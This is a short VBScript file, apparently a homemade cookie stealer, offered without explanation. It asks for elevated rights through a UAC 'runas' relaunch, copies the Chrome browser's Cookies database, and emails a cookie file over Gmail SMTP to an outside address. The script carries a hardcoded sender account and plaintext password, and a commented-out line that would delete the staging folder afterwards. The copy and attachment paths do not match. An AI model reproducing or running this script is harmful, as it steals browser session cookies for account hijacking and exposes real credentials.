If WScript.Arguments.length =0 Then
  Set objShell = CreateObject("Shell.Application")
  'Pass a bogus argument with leading blank space, say [ uac]
  objShell.ShellExecute "wscript.exe", Chr(34) & _
  "C:\Users\ravi\Desktop\a.vbs" & Chr(34) & " uac", "", "runas", 1
Else
  'Add your code here
End If

Set obj = CreateObject("Scripting.FileSystemObject")
 obj.CopyFile "C:\Users\ravi\AppData\Local\Google\Chrome\User Data\Default\Cookies", "C:\Users\ravi\Desktop" 

Set objEmail          = CreateObject("CDO.Message")
objEmail.From       = "rvbhushan18@gmail.com"
objEmail.To           = "dilrajsingh17@gmail.com"
objEmail.Subject    = "TEST E-Mail Script" & vbTab & Now()
objEmail.Textbody = "TEST E-Mail Script" & vbTab & Now()
objEmail.AddAttachment "C:\Users\Public\a\Cookies"    
objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com" 
objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate")=1
objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = true
objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername")="rvbhushan18@gmail.com" 
objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword")="OmMataPitaNamastay"


objEmail.Configuration.Fields.Update
objEmail.Send

WScript.Sleep 6000
Set obj = CreateObject("Scripting.FileSystemObject")
'obj.DeleteFolder("C:\Users\Public\a\")

Wscript.Quit

